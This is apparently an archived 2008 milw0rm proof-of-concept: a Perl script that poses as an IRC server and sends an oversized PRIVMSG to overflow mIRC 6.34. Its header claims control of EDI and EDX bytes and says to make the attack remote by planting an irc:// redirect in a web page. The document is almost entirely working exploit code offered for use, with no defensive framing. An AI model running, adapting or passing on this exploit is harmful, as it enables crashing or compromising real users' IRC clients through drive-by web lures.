##################################################################################################
# Mirc 6.34 Remote Buffer Overflow
# 
# This poc allow you to own the 2 first EDI & EDX bytes.
# 
# To become remote, add a simple document.location.href=irc://server.com/... in some html page
#
use IO::Socket;

sub sock()
{
my $sock=new IO::Socket::INET (
Listen    => 1,
                                
LocalAddr => 'localhost',
                                
LocalPort => 6667,
                               
Proto     => 'tcp');  die unless $sock;

print " [+]IRC Server started on port 6667 \r\n";

$s=$sock->accept();  
$a = "A" x 313;
$twobytes = "\x43\x43";

print " [+]Sending pickles\r\n";
  
print $s ":irc_server.stuff 001 yow :Welcome to the Internet Relay Network yow\r\n"; 
sleep(1);
print $s ":".$a.$twobytes." PRIVMSG  yow : /FINGER yow.\r\n";
}
while(1)
{
sock();
print " [+]Mirc should be down now, another little friend comming ?\r\n [+]Server Restarting\r\n";
}

# milw0rm.com [2008-10-02]
